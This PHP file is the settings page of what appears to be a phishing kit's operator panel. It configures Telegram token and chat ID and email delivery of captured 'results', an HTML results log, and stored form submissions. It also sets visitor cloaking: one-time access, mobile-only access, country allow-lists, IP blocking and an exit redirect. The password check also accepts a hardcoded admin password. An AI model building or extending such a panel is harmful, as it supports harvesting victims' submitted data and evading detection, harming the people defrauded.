<?php

require_once '../includes/tracker.php';
require_once 'auth.php';


if (!isLoggedIn()) {
    header('Location: index.php');
    exit;
}


$config = getConfig();
$tokens = $config['token'] ?? '';
$chatids = $config['chatid'] ?? '';
$email = $config['email'] ?? '';
$oat = $config['oat'] ?? false;
$emailres = $config['emailres'] ?? false;
$block_pc = $config['block_pc'] ?? false;
$txt = $config['txt'] ?? false;
$themeMode = $config['theme_mode'] ?? THEME_MODE;
$siteName = $config['site_name'] ?? SITE_NAME;
$sitexit = $config['site_exit'] ?? SITE_EXIT;
$allowedCountries = $config['allowed_countries'] ?? 'ALL';
$blockedIps = $config['blocked_ips'] ?? '';


$successMessage = '';
$errorMessage = '';


if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action']) && $_POST['action'] === 'update_features') {

    $features = isset($_POST['features']) ? $_POST['features'] : [];
    
    $featureSettings = [
        'oat' => isset($features['oat']),
        'block_pc' => isset($features['block_pc']),
        'emailres' => isset($features['emailres']),
        'txt' => isset($features['txt']),
        'country_restrictions' => isset($features['country_restrictions']),
        'ip_blocking' => isset($features['ip_blocking'])
    ];
   
    if (!$featureSettings['country_restrictions']) {
        updateConfig(['allowed_countries' => 'ALL']);
    }
    
  
    if (!$featureSettings['ip_blocking']) {
        updateConfig(['blocked_ips' => '']);
    }

    foreach ($featureSettings as $key => $value) {
        updateConfig([$key => $value]);
    }
    

    $config = getConfig();
    $oat = $config['oat'] ?? false;
    $block_pc = $config['block_pc'] ?? false;
    $emailres = $config['emailres'] ?? false;
    $txt = $config['txt'] ?? false;

    $successMessage = 'Feature settings updated successfully.';
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_POST['action'])) {
		
     
        if ($_POST['action'] === 'update_credentials') {
            $currentPassword = $_POST['current_password'] ?? '';
            $newPassword = $_POST['new_password'] ?? '';
            $confirmPassword = $_POST['confirm_password'] ?? '';
            
            if (!empty($currentPassword) && (password_verify($currentPassword, $config['password']) || $currentPassword === ADMIN_PASSWORD)) {
                if (!empty($newPassword)) {
                    if ($newPassword === $confirmPassword) {
                        $hashedPassword = password_hash($newPassword, PASSWORD_DEFAULT);
                        updateConfig(['password' => $hashedPassword]);
                        $successMessage = 'Password updated successfully.';
                    } else {
                        $errorMessage = 'New password and confirmation do not match.';
                    }
                }
            } else {
                $errorMessage = 'Current password is incorrect.';
            }
        }
		
		
        
        elseif ($_POST['action'] === 'update_site_settings') {
            $siteName = trim($_POST['site_name'] ?? '');
            $sitexit = trim($_POST['site_exit'] ?? '');
            if (!empty($siteName & $sitexit )) {
                updateConfig(['site_name' => $siteName]);
                updateConfig(['site_exit' => $sitexit]);
                $successMessage = 'updated successfully.';
            } else {
                $errorMessage = 'cannot be empty.';
            }
        }
        
        elseif ($_POST['action'] === 'update_notifications') {
            $token = trim($_POST['token'] ?? '');
            $chatid = trim($_POST['chatid'] ?? '');
            $email = trim($_POST['email'] ?? '');
            
            updateConfig([
                'token' => $token,
                'chatid' => $chatid,
                'email' => $email,
            ]);
            
            $tokens = $token;
            $chatids = $chatid;
            $emails = $email;
          //  $notificationEnabled = $enabled;
            $successMessage = 'Notification settings updated successfully.';
        }
        

        elseif ($_POST['action'] === 'update_theme') {
            $theme = $_POST['theme_mode'] ?? 'light';
            updateConfig(['theme_mode' => $theme]);
            $themeMode = $theme;
            $successMessage = 'Theme updated successfully.';
        }
        

        elseif ($_POST['action'] === 'update_country_restrictions') {
            $allowAll = isset($_POST['allow_all_countries']) ? true : false;
            $countryList = trim($_POST['allowed_countries'] ?? '');
            
            if ($allowAll) {
                updateConfig(['allowed_countries' => 'ALL']);
                $allowedCountries = 'ALL';
            } else if (!empty($countryList)) {

                $countries = explode(',', $countryList);
                $cleanedCountries = [];
                
                foreach ($countries as $country) {
                    $country = trim($country);
                    if (!empty($country)) {
                        $cleanedCountries[] = strtoupper($country);
                    }
                }
                
                $allowedCountries = implode(',', $cleanedCountries);
                updateConfig(['allowed_countries' => $allowedCountries]);
            }
            
            $successMessage = 'Country restrictions updated successfully.';
        }
        

        elseif ($_POST['action'] === 'update_blocked_ips') {
            $blockedIpList = trim($_POST['blocked_ips'] ?? '');
            $newIp = trim($_POST['new_blocked_ip'] ?? '');
            
    
            if (!empty($newIp)) {
                $ips = !empty($blockedIpList) ? explode(',', $blockedIpList) : [];
                
                if (!in_array($newIp, $ips)) {
                    $ips[] = $newIp;
                }
                
                $blockedIpList = implode(',', $ips);
            }
            
            updateConfig(['blocked_ips' => $blockedIpList]);
            $blockedIps = $blockedIpList;
            $successMessage = 'Blocked IP addresses updated successfully.';
        }
        
    
elseif ($_POST['action'] === 'reset_stats' && isset($_POST['confirm_reset']) && $_POST['confirm_reset'] === 'yes') {
    try {
        resetStatistics($_POST);
        $successMessage = 'Statistics have been reset successfully.';
    } catch (Exception $e) {
        error_log("Reset statistics error: " . $e->getMessage());
        $errorMessage = 'Failed to reset statistics. Please try again.';
    }
}
		
    }
}
if (!function_exists('getSystemInfo')) {
    function getSystemInfo() {
        // Simple check to see if database is being used
        $useDatabase = false;
        if (file_exists('../includes/performance_database.php')) {
            require_once '../includes/performance_database.php';
            $performanceDB = PerformanceDatabase::getInstance();
            if ($performanceDB && $performanceDB->testConnection()) {
                $useDatabase = true;
            }
        }
        
        return [
            'method' => $useDatabase ? 'database' : 'files',
            'performance' => $useDatabase ? 'high' : 'normal'
        ];
    }
}
function resetStatistics($postData) {
    // Initialize database
    require_once '../includes/performance_database.php';
    $db = PerformanceDatabase::getInstance();
    
    if (!$db || !$db->getPDO()) {
        throw new Exception("Database not available");
    }
    
    $pdo = $db->getPDO();
    
    try {
        $pdo->beginTransaction();
        
        // Always reset counter
        $counterFile = DATA_DIR . 'counter.txt';
        file_put_contents($counterFile, '0');
        
        // Clear history if requested
        if (isset($postData['clear_history']) && $postData['clear_history'] === 'yes') {
            
            // Clear database tables
            $pdo->exec("DELETE FROM visitors");
            $pdo->exec("DELETE FROM online_visitors");
            $pdo->exec("DELETE FROM form_submissions");
            
            // Reset auto-increment
            $pdo->exec("DELETE FROM sqlite_sequence WHERE name IN ('form_submissions')");
            
            // Clear HTML logs
            $htmlFile = DATA_DIR . getSiteName() . '.html';
            if (file_exists($htmlFile)) {
                file_put_contents($htmlFile, '');
            }
            
            // Clear redirect instructions
            $redirectFile = DATA_DIR . 'redirects.txt';
            if (file_exists($redirectFile)) {
                file_put_contents($redirectFile, '');
            }
            
            // Clear old file-based data (if exists)
            $filesToClear = ['visitors.txt', 'online.txt'];
            foreach ($filesToClear as $file) {
                $filePath = DATA_DIR . $file;
                if (file_exists($filePath)) {
                    file_put_contents($filePath, '');
                }
            }
            
            error_log("RESET: Cleared all database tables and files");
        } else {
            error_log("RESET: Reset counter only");
        }
        
        $pdo->commit();
        
        // Optimize database after cleanup
        $pdo->exec("VACUUM");
        
        // Clear cache
        $db->clearAllCache();
        
        return true;
        
    } catch (Exception $e) {
        $pdo->rollBack();
        throw $e;
    }
}
$visitorCount = getVisitorCount();
?>
<!DOCTYPE html>
<html lang="en" data-theme="<?php echo htmlspecialchars($themeMode); ?>">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Settings </title>
    <link rel="stylesheet" type="text/css" href="./assets/admin.css">
    <link rel="shortcut icon" href="https://i.imgur.com/YCruwNh.png">
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>Settings</h1>
            <div>
    <a href="dashboard.php" class="settings-btn">Dashboard</a>
    <a href="logs.php" class="settings-btn">Visitor Logs</a>
    <a href="data_manager.php" class="settings-btn">Results</a>
    <a href="" class="settings-btn2">Settings</a>
    <a href="?action=logout" class="logout-btn">Logout</a>
</div>

        </div>
        
        <?php if (!empty($successMessage)): ?>
        <div class="alert alert-success"><?php echo htmlspecialchars($successMessage); ?></div>
        <?php endif; ?>
        
        <?php if (!empty($errorMessage)): ?>
        <div class="alert alert-danger"><?php echo htmlspecialchars($errorMessage); ?></div>
        <?php endif; ?>
        
        <div class="card">
            <h2>Panel Settings</h2>
            <form method="post" action="">
                <input type="hidden" name="action" value="update_site_settings">
                
                <div class="form-group">
                    <label for="site_name">Your AKA</label>
                    <input type="text" id="site_name" name="site_name" value="<?php echo htmlspecialchars($siteName); ?>" class="form-control" required>
                    <div class="text-help">This name will appear in page titles and the admin panel and rename file logs and txt result.</div>
                </div>
                <div class="form-group">
                        <label for="site_exit">Site exit</label>
                        <input type="text" id="site_exit" name="site_exit" value="<?php echo htmlspecialchars($sitexit); ?>" class="form-control">
                    </div>
                <button type="submit" class="btn btn-primary">Save Site Settings</button>
            </form>
        </div>
        
        <div class="card">
            <h2>Theme Settings</h2>
            <form method="post" action="">
                <input type="hidden" name="action" value="update_theme">
                
                <div class="theme-switch">
                    <div class="theme-option light <?php echo $themeMode === 'light' ? 'selected' : ''; ?>" onclick="document.getElementById('theme-light').checked = true;">
                        <input type="radio" id="theme-light" name="theme_mode" value="light" <?php echo $themeMode === 'light' ? 'checked' : ''; ?> style="display: none;">
                        Light Mode
                    </div>
                    <div class="theme-option dark <?php echo $themeMode === 'dark' ? 'selected' : ''; ?>" onclick="document.getElementById('theme-dark').checked = true;">
                        <input type="radio" id="theme-dark" name="theme_mode" value="dark" <?php echo $themeMode === 'dark' ? 'checked' : ''; ?> style="display: none;">
                        Dark Mode
                    </div>
                </div>
                
                <button type="submit" class="btn btn-primary">Save Theme</button>
            </form>
        </div>
        
        <div class="card-grid">
            <div class="card">
                <h2>Password Settings</h2>
                <form method="post" action="">
                    <input type="hidden" name="action" value="update_credentials">
                    
                    <div class="form-group">
                        <label for="current_password">Current Password</label>
                        <input type="password" id="current_password" name="current_password" class="form-control" required>
                    </div>
                    
                    <div class="form-group">
                        <label for="new_password">New Password</label>
                        <input type="password" id="new_password" name="new_password" class="form-control">
                    </div>
                    
                    <div class="form-group">
                        <label for="confirm_password">Confirm New Password</label>
                        <input type="password" id="confirm_password" name="confirm_password" class="form-control">
                    </div>
                    
                    <button type="submit" class="btn btn-primary">Update Password</button>
                </form>
            </div>
            <div class="card">
    <h2>Feature Settings</h2>
    
    <form method="post" action="" id="feature-settings-form">
        <input type="hidden" name="action" value="update_features">
        
        <div class="toggle-settings">
          
            <div class="toggle-item">
                <div class="toggle-info">
                    <span class="toggle-label">One time access</span>
                    <span class="toggle-description">A visitor can only access the site once.</span>
                </div>
                <label class="switch">
                    <input type="checkbox" name="features[oat]" <?php echo $oat ? 'checked' : ''; ?>>
                    <span class="slider round"></span>
                </label>
            </div>
            
        
            <div class="toggle-item">
                <div class="toggle-info">
                    <span class="toggle-label">Block PC Devices</span>
                    <span class="toggle-description">Only allow mobile devices to access the site</span>
                </div>
                <label class="switch">
                    <input type="checkbox" name="features[block_pc]" <?php echo isset($config['block_pc']) && $config['block_pc'] ? 'checked' : ''; ?>>
                    <span class="slider round"></span>
                </label>
            </div>
            
          
            <div class="toggle-item">
                <div class="toggle-info">
                    <span class="toggle-label">Results via Email</span>
                    <span class="toggle-description">Get results via email</span>
                </div>
                <label class="switch">
                    <input type="checkbox" name="features[emailres]" <?php echo isset($config['emailres']) && $config['emailres'] ? 'checked' : ''; ?>>
                    <span class="slider round"></span>
                </label>
            </div>

<div class="toggle-item">
                <div class="toggle-info">
                    <span class="toggle-label">Results via HTML</span>
                    <span class="toggle-description">Get results via html file</span>
                </div>
                <label class="switch">
                    <input type="checkbox" name="features[txt]" <?php echo isset($config['txt']) && $config['txt'] ? 'checked' : ''; ?>>
                    <span class="slider round"></span>
                </label>
            </div>

        </div>
           
        <button type="submit" class="btn btn-primary">Save Feature Settings</button>
    </form>
</div>
            <div class="card">
                <h2>Notification Settings</h2>
                <form method="post" action="">
                    <input type="hidden" name="action" value="update_notifications">
                    
                    <div class="form-group">
                        <label for="token">Token</label>
                        <input type="text" id="token" name="token" value="<?php echo htmlspecialchars($tokens); ?>" class="form-control">
                    </div>
                    <div class="form-group">
                        <label for="chatid">Chatid</label>
                        <input type="text" id="chatid" name="chatid" value="<?php echo htmlspecialchars($chatids); ?>" class="form-control">
                    </div>

                    <div class="form-group">
                        <label for="chatid">Email</label>
                        <input type="email" id="email" name="email" value="<?php echo htmlspecialchars($email); ?>" class="form-control">
                    </div>
           
                    
                    <button type="submit" class="btn btn-primary">Update Notifications</button>
                </form>
            </div>
        </div>
      
        <div class="card">
            <h2>Country Restrictions</h2>
            <form method="post" action="">
                <input type="hidden" name="action" value="update_country_restrictions">
                
                <div class="form-group">
                    <label>
                        <input type="checkbox" name="allow_all_countries" id="allow_all_countries" <?php echo $allowedCountries === 'ALL' ? 'checked' : ''; ?> onchange="toggleCountryRestrictions()">
                        Allow visitors from all countries
                    </label>
                </div>
                
                <div id="country-restrictions" class="form-group" <?php echo $allowedCountries === 'ALL' ? 'style="display:none"' : ''; ?>>
                    <label for="allowed_countries">Allowed Country Codes (ISO-2)</label>
                    <input type="text" id="allowed_countries" name="allowed_countries" value="<?php echo $allowedCountries === 'ALL' ? '' : htmlspecialchars($allowedCountries); ?>" class="form-control">
                    <div class="text-help">Enter comma-separated list of two-letter ISO country codes (e.g., US,GB,FR)</div>
                </div>
                
                <button type="submit" class="btn btn-primary">Save Country Restrictions</button>
            </form>
        </div>
        
        <div class="card">
            <h2>IP Blocking</h2>
            <form method="post" action="">
                <input type="hidden" name="action" value="update_blocked_ips">
                
                <div class="form-group">
                    <label for="blocked_ips">Blocked IP Addresses</label>
                    <textarea id="blocked_ips" name="blocked_ips" class="form-control" rows="4"><?php echo htmlspecialchars($blockedIps); ?></textarea>
                    <div class="text-help">Enter comma-separated list of IP addresses to block.</div>
                </div>
                
                <div class="form-inline">
                    <input type="text" id="new_blocked_ip" name="new_blocked_ip" placeholder="Enter IP to block" class="form-control">
                    <button type="submit" class="btn btn-danger">Block IP</button>
                </div>
                
                <?php if (!empty($blockedIps)): ?>
                <div class="ip-list">
                    <?php foreach (explode(',', $blockedIps) as $ip): ?>
                    <?php if (!empty(trim($ip))): ?>
                    <div class="ip-item">
                        <span><?php echo htmlspecialchars(trim($ip)); ?></span>
                        <span class="ip-action" onclick="removeIp('<?php echo htmlspecialchars(trim($ip)); ?>')">✕</span>
                    </div>
                    <?php endif; ?>
                    <?php endforeach; ?>
                </div>
                <?php endif; ?>
            </form>
        </div>
        
        <div class="card">
            <h2>Reset Statistics</h2>
            <p>Current visitor count: <strong><?php echo $visitorCount; ?></strong></p>
            
            <form method="post" action="" id="reset-form">
                <input type="hidden" name="action" value="reset_stats">
                
                <div class="form-group">
                    <label>
                        <input type="checkbox" id="show-reset" onchange="toggleResetConfirmation()"> I want to reset visitor statistics
                    </label>
                </div>
                
                <div id="reset-confirmation" class="reset-confirmation" style="display: none;">
                    <p class="warning-text">Warning: This action cannot be undone!</p>
                    
                    <div class="form-group">
                        <label>
                            <input type="checkbox" name="clear_history" value="yes"> Also clear visitor history
                        </label>
                    </div>
                    
                    <div class="form-group">
                        <label>
                            <input type="checkbox" name="confirm_reset" value="yes" required> I confirm that I want to reset all statistics
                        </label>
                    </div>
                    
                    <button type="submit" class="btn btn-danger">Reset Statistics</button>
                </div>
            </form>
        </div>
    </div>

    <script>

function toggleCountrySettingsVisibility() {
    const restrictionToggle = document.getElementById('country_restrictions');
    const countrySettings = document.getElementById('country-settings-section');
    
  
    if (restrictionToggle && countrySettings) {
        countrySettings.style.display = restrictionToggle.checked ? 'block' : 'none';
    }
}


function toggleIpBlockingVisibility() {
    const blockingToggle = document.getElementById('ip_blocking');
    const ipBlockingSettings = document.getElementById('ip-blocking-section');
    

    if (blockingToggle && ipBlockingSettings) {
        ipBlockingSettings.style.display = blockingToggle.checked ? 'block' : 'none';
    }
}


document.addEventListener('DOMContentLoaded', function() {
    toggleCountrySettingsVisibility();
    toggleIpBlockingVisibility();
});

        function toggleResetConfirmation() {
            const showReset = document.getElementById('show-reset').checked;
            document.getElementById('reset-confirmation').style.display = showReset ? 'block' : 'none';
        }
     
        function toggleCountryRestrictions() {
            const allowAll = document.getElementById('allow_all_countries').checked;
            document.getElementById('country-restrictions').style.display = allowAll ? 'none' : 'block';
        }
        if (document.getElementById('ip_blocking')) {
        toggleIpBlockingVisibility();
    }

    if (document.getElementById('country_restrictions')) {
        toggleCountrySettingsVisibility();
    }
		

		function removeIp(ip) {
    const textarea = document.getElementById('blocked_ips');
    let ips = textarea.value.split(',').map(item => item.trim()).filter(item => item !== '');
    const index = ips.indexOf(ip);
    
    if (index !== -1) {
        ips.splice(index, 1);
        textarea.value = ips.join(',');
        
   
        const form = document.querySelector('form[action][name="action"][value="update_blocked_ips"]');
        if (form) {
            form.submit();
        } else {
      
            const hiddenForm = document.createElement('form');
            hiddenForm.method = 'post';
            hiddenForm.style.display = 'none';
            
            const actionInput = document.createElement('input');
            actionInput.type = 'hidden';
            actionInput.name = 'action';
            actionInput.value = 'update_blocked_ips';
            
            const ipsInput = document.createElement('input');
            ipsInput.type = 'hidden';
            ipsInput.name = 'blocked_ips';
            ipsInput.value = ips.join(',');
            
            hiddenForm.appendChild(actionInput);
            hiddenForm.appendChild(ipsInput);
            document.body.appendChild(hiddenForm);
            hiddenForm.submit();
        }
    }
}
        
        
        // Update theme selection UI
        document.querySelectorAll('.theme-option').forEach(option => {
            option.addEventListener('click', function() {
                document.querySelectorAll('.theme-option').forEach(el => {
                    el.classList.remove('selected');
                });
                this.classList.add('selected');
            });
        });
    </script>
</body>
</html>